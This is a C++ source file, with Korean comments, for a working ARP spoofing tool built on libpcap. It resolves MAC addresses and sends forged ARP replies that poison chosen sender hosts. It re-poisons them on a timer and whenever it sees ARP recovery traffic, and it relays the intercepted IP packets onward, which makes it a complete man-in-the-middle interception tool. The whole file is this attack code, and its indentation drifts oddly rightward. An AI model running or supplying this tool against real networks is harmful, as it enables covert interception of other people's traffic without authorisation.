#include "arp-spoof.h"

#include <pcap.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <netinet/in.h>
#include <sys/time.h>

#include <cstdio>
#include <cstdlib>
#include <cstring>
#include <string>
#include <vector>
#include <map>
#include <algorithm>
#include <iostream>
#include <fstream>

// -------------------- 유틸 --------------------
static bool get_iface_mac(const std::string& iface, uint8_t mac[MAC_LEN]) {
    std::ifstream f("/sys/class/net/" + iface + "/address");
    if (!f.is_open()) return false;
    std::string line; std::getline(f, line);
    line.erase(std::remove(line.begin(), line.end(), ':'), line.end());
    if (line.length() != 12) return false;
    for (int i = 0; i < MAC_LEN; ++i)
        mac[i] = std::stoi(line.substr(i*2, 2), nullptr, 16);
    return true;
}

static std::string mac_to_s(const uint8_t m[MAC_LEN]) {
    char b[32];
    snprintf(b, sizeof(b), "%02x:%02x:%02x:%02x:%02x:%02x",
             m[0], m[1], m[2], m[3], m[4], m[5]);
    return std::string(b);
}

static std::string ip_to_s(uint32_t nip) {
    struct in_addr a{nip};
    char b[INET_ADDRSTRLEN];
    return std::string(inet_ntop(AF_INET, &a, b, sizeof(b)));
}

static uint64_t now_ms() {
    struct timeval tv; gettimeofday(&tv, nullptr);
    return (uint64_t)tv.tv_sec * 1000ULL + tv.tv_usec / 1000ULL;
}

// -------------------- 플로우 --------------------
struct FlowKey {
    uint32_t sender_ip; // network byte order
    uint32_t target_ip; // network byte order
    bool operator<(const FlowKey& o) const {
        if (sender_ip != o.sender_ip) return sender_ip < o.sender_ip;
        return target_ip < o.target_ip;
    }
};

struct Flow {
    uint8_t sender_mac[MAC_LEN]{};
    uint8_t target_mac[MAC_LEN]{};
    bool sender_mac_ok{false};
    bool target_mac_ok{false};
    uint64_t last_infect_ms{0};
};

static std::map<FlowKey, Flow> flows;

// -------------------- 패킷 송신 헬퍼 --------------------
static bool send_arp_request(pcap_t* handle, const uint8_t attacker_mac[MAC_LEN], uint32_t query_ip) {
    uint8_t pkt[42] = {0};
    EthHdr* eth = (EthHdr*)pkt;
    ArpHdr* arp = (ArpHdr*)(pkt + sizeof(EthHdr));

    memset(eth->dmac, 0xff, MAC_LEN);
    memcpy(eth->smac, attacker_mac, MAC_LEN);
    eth->type = htons(0x0806);

    arp->hrd = htons(1);
    arp->pro = htons(0x0800);
    arp->hln = MAC_LEN;
    arp->pln = IP_LEN;
    arp->op  = htons(1);
    memcpy(arp->smac, attacker_mac, MAC_LEN);
    memset(arp->sip, 0x00, IP_LEN);
    memset(arp->tmac, 0x00, MAC_LEN);
    memcpy(arp->tip, &query_ip, IP_LEN);

    return pcap_sendpacket(handle, pkt, sizeof(pkt)) == 0;
}

static bool send_arp_infect_to_sender(pcap_t* handle,
                                      const uint8_t attacker_mac[MAC_LEN],
                                      const uint8_t sender_mac[MAC_LEN],
                                      uint32_t sender_ip, uint32_t target_ip) {
    uint8_t pkt[42] = {0};
    EthHdr* eth = (EthHdr*)pkt;
    ArpHdr* arp = (ArpHdr*)(pkt + sizeof(EthHdr));

    memcpy(eth->dmac, sender_mac, MAC_LEN);
    memcpy(eth->smac, attacker_mac, MAC_LEN);
    eth->type = htons(0x0806);

    arp->hrd = htons(1);
    arp->pro = htons(0x0800);
    arp->hln = MAC_LEN;
    arp->pln = IP_LEN;
    arp->op  = htons(2);

    memcpy(arp->smac, attacker_mac, MAC_LEN); // "이 MAC이"
    memcpy(arp->sip, &target_ip, IP_LEN);     // "target_ip"다
    memcpy(arp->tmac, sender_mac, MAC_LEN);
    memcpy(arp->tip, &sender_ip, IP_LEN);

    return pcap_sendpacket(handle, pkt, sizeof(pkt)) == 0;
                                      }

                                      static bool send_arp_request_and_wait_mac(pcap_t* handle,
                                                                                const uint8_t attacker_mac[MAC_LEN],
                                                                                uint32_t query_ip,
                                                                                uint8_t out_mac[MAC_LEN],
                                                                                int timeout_ms = 1500) {
                                          if (!send_arp_request(handle, attacker_mac, query_ip)) return false;

                                          uint64_t end = now_ms() + timeout_ms;
                                          struct pcap_pkthdr* h; const u_char* p;

                                          while (now_ms() < end) {
                                              int r = pcap_next_ex(handle, &h, &p);
                                              if (r == 0) continue;
                                              if (r < 0) break;
                                              if (h->caplen < sizeof(EthHdr) + sizeof(ArpHdr)) continue;

                                              const EthHdr* eth = (const EthHdr*)p;
                                              if (ntohs(eth->type) != 0x0806) continue;

                                              const ArpHdr* arp = (const ArpHdr*)(p + sizeof(EthHdr));
                                              if (ntohs(arp->op) != 2) continue;

                                              uint32_t spa;
                                              memcpy(&spa, arp->sip, IP_LEN);
                                              if (spa == query_ip) {
                                                  memcpy(out_mac, arp->smac, MAC_LEN);
                                                  return true;
                                              }
                                          }
                                          return false;
                                                                                }

                                                                                static bool relay_ip_packet_to_target(pcap_t* handle,
                                                                                                                      const uint8_t attacker_mac[MAC_LEN],
                                                                                                                      const uint8_t target_mac[MAC_LEN],
                                                                                                                      const u_char* pkt, uint32_t len) {
                                                                                    std::vector<uint8_t> buf(pkt, pkt + (size_t)len);
                                                                                    EthHdr* eth = (EthHdr*)buf.data();
                                                                                    memcpy(eth->dmac, target_mac, MAC_LEN);
                                                                                    memcpy(eth->smac, attacker_mac, MAC_LEN);
                                                                                    return pcap_sendpacket(handle, buf.data(), (int)buf.size()) == 0;
                                                                                                                      }

                                                                                                                      // -------------------- 메인 --------------------
                                                                                                                      static void usage() {
                                                                                                                          printf("syntax : arp-spoof <interface> <sender ip 1> <target ip 1> [<sender ip 2> <target ip 2>...]\n");
                                                                                                                          exit(1);
                                                                                                                      }

                                                                                                                      int main(int argc, char* argv[]) {
                                                                                                                          if (argc < 4 || ((argc - 2) % 2 != 0)) usage();

                                                                                                                          std::string dev = argv[1];

                                                                                                                          // 인터페이스 MAC
                                                                                                                          uint8_t attacker_mac[MAC_LEN];
                                                                                                                          if (!get_iface_mac(dev, attacker_mac)) {
                                                                                                                              std::cerr << "Failed to get MAC address for iface: " << dev << "\n";
                                                                                                                              return 1;
                                                                                                                          }
                                                                                                                          std::cout << "[*] Attacker MAC: " << mac_to_s(attacker_mac) << "\n";

                                                                                                                          // 플로우 구성
                                                                                                                          for (int i = 2; i < argc; i += 2) {
                                                                                                                              uint32_t s_ip, t_ip;
                                                                                                                              if (inet_pton(AF_INET, argv[i], &s_ip) != 1 ||
                                                                                                                                  inet_pton(AF_INET, argv[i+1], &t_ip) != 1) {
                                                                                                                                  std::cerr << "Invalid IP: " << argv[i] << " or " << argv[i+1] << "\n";
                                                                                                                              return 1;
                                                                                                                                  }
                                                                                                                                  flows[{s_ip, t_ip}] = Flow{};
                                                                                                                          }

                                                                                                                          // pcap open (jumbo)
                                                                                                                          char errbuf[PCAP_ERRBUF_SIZE];
                                                                                                                          pcap_t* handle = pcap_open_live(dev.c_str(), 65535, 1, 10, errbuf);
                                                                                                                          if (!handle) {
                                                                                                                              std::cerr << "pcap_open_live() failed: " << errbuf << "\n";
                                                                                                                              return 1;
                                                                                                                          }

                                                                                                                          // BPF filter
                                                                                                                          struct bpf_program fp;
                                                                                                                          if (pcap_compile(handle, &fp, "arp or ip", 1, PCAP_NETMASK_UNKNOWN) == -1 ||
                                                                                                                              pcap_setfilter(handle, &fp) == -1) {
                                                                                                                              std::cerr << "pcap setfilter failed\n";
                                                                                                                          pcap_close(handle);
                                                                                                                          return 1;
                                                                                                                              }
                                                                                                                              pcap_freecode(&fp);

                                                                                                                              // 각 플로우 MAC 확인 & 1차 감염
                                                                                                                              for (auto& it : flows) {
                                                                                                                                  const FlowKey& k = it.first;
                                                                                                                                  Flow& f = it.second;

                                                                                                                                  std::cout << "[*] Resolving "
                                                                                                                                  << ip_to_s(k.sender_ip) << " (sender) -> "
                                                                                                                                  << ip_to_s(k.target_ip) << " (target)\n";

                                                                                                                                  f.sender_mac_ok = send_arp_request_and_wait_mac(handle, attacker_mac, k.sender_ip, f.sender_mac, 2000);
                                                                                                                                  f.target_mac_ok = send_arp_request_and_wait_mac(handle, attacker_mac, k.target_ip, f.target_mac, 2000);

                                                                                                                                  if (!f.sender_mac_ok) std::cerr << "  - Failed to resolve sender MAC\n";
                                                                                                                                  else std::cout << "  - sender MAC: " << mac_to_s(f.sender_mac) << "\n";
                                                                                                                                  if (!f.target_mac_ok) std::cerr << "  - Failed to resolve target MAC\n";
                                                                                                                                  else std::cout << "  - target MAC: " << mac_to_s(f.target_mac) << "\n";

                                                                                                                                  if (f.sender_mac_ok) {
                                                                                                                                      send_arp_infect_to_sender(handle, attacker_mac, f.sender_mac, k.sender_ip, k.target_ip);
                                                                                                                                      f.last_infect_ms = now_ms();
                                                                                                                                      std::cout << "  - infected sender (" << ip_to_s(k.sender_ip) << ")\n";
                                                                                                                                  }
                                                                                                                              }

                                                                                                                              const uint64_t infect_interval_ms = 5000; // 5초 주기 재감염

                                                                                                                              // 캡처 루프
                                                                                                                              while (true) {
                                                                                                                                  // 주기적 재감염
                                                                                                                                  uint64_t tnow = now_ms();
                                                                                                                                  for (auto& it : flows) {
                                                                                                                                      const FlowKey& k = it.first; Flow& f = it.second;
                                                                                                                                      if (f.sender_mac_ok && tnow - f.last_infect_ms >= infect_interval_ms) {
                                                                                                                                          send_arp_infect_to_sender(handle, attacker_mac, f.sender_mac, k.sender_ip, k.target_ip);
                                                                                                                                          f.last_infect_ms = tnow;
                                                                                                                                      }
                                                                                                                                  }

                                                                                                                                  struct pcap_pkthdr* h; const u_char* p;
                                                                                                                                  int r = pcap_next_ex(handle, &h, &p);
                                                                                                                                  if (r == 0) continue;
                                                                                                                                  if (r < 0) break;
                                                                                                                                  if (h->caplen < sizeof(EthHdr)) continue;

                                                                                                                                  const EthHdr* eth = (const EthHdr*)p;
                                                                                                                                  uint16_t etype = ntohs(eth->type);

                                                                                                                                  // ARP: recover 징후 탐지 → 즉시 재감염
                                                                                                                                  if (etype == 0x0806 && h->caplen >= sizeof(EthHdr) + sizeof(ArpHdr)) {
                                                                                                                                      const ArpHdr* arp = (const ArpHdr*)(p + sizeof(EthHdr));
                                                                                                                                      uint16_t op = ntohs(arp->op);

                                                                                                                                      uint32_t spa, tpa;
                                                                                                                                      memcpy(&spa, arp->sip, IP_LEN);
                                                                                                                                      memcpy(&tpa, arp->tip, IP_LEN);

                                                                                                                                      for (auto& it : flows) {
                                                                                                                                          const FlowKey& k = it.first; Flow& f = it.second;

                                                                                                                                          // sender의 who-has(target)
                                                                                                                                          if (op == 1 && spa == k.sender_ip && tpa == k.target_ip && f.sender_mac_ok) {
                                                                                                                                              send_arp_infect_to_sender(handle, attacker_mac, f.sender_mac, k.sender_ip, k.target_ip);
                                                                                                                                              f.last_infect_ms = now_ms();
                                                                                                                                          }
                                                                                                                                          // target의 reply(sender) (진짜 MAC 알림)
                                                                                                                                          if (op == 2 && spa == k.target_ip && tpa == k.sender_ip && f.sender_mac_ok) {
                                                                                                                                              send_arp_infect_to_sender(handle, attacker_mac, f.sender_mac, k.sender_ip, k.target_ip);
                                                                                                                                              f.last_infect_ms = now_ms();
                                                                                                                                          }
                                                                                                                                          // 보너스: 모르는 MAC 학습
                                                                                                                                          if (!f.sender_mac_ok && spa == k.sender_ip) {
                                                                                                                                              memcpy(f.sender_mac, arp->smac, MAC_LEN); f.sender_mac_ok = true;
                                                                                                                                          }
                                                                                                                                          if (!f.target_mac_ok && spa == k.target_ip) {
                                                                                                                                              memcpy(f.target_mac, arp->smac, MAC_LEN); f.target_mac_ok = true;
                                                                                                                                          }
                                                                                                                                      }
                                                                                                                                      continue;
                                                                                                                                  }

                                                                                                                                  // IP: sender→attacker 로 온 스푸핑된 프레임을 target으로 릴레이
                                                                                                                                  if (etype == 0x0800) {
                                                                                                                                      if (h->caplen < sizeof(EthHdr) + sizeof(IpHdr)) continue;
                                                                                                                                      const IpHdr* ip = (const IpHdr*)(p + sizeof(EthHdr));

                                                                                                                                      for (auto& it : flows) {
                                                                                                                                          const FlowKey& k = it.first; Flow& f = it.second;
                                                                                                                                          if (!f.sender_mac_ok || !f.target_mac_ok) continue;

                                                                                                                                          if (memcmp(eth->dmac, attacker_mac, MAC_LEN) != 0) continue;
                                                                                                                                          if (memcmp(eth->smac, f.sender_mac, MAC_LEN) != 0) continue;

                                                                                                                                          if (ip->saddr != k.sender_ip || ip->daddr != k.target_ip) continue;

                                                                                                                                          if (!relay_ip_packet_to_target(handle, attacker_mac, f.target_mac, p, h->caplen)) {
                                                                                                                                              std::cerr << "relay failed\n";
                                                                                                                                          }
                                                                                                                                      }
                                                                                                                                      continue;
                                                                                                                                  }
                                                                                                                              }

                                                                                                                              pcap_close(handle);
                                                                                                                              return 0;
                                                                                                                      }
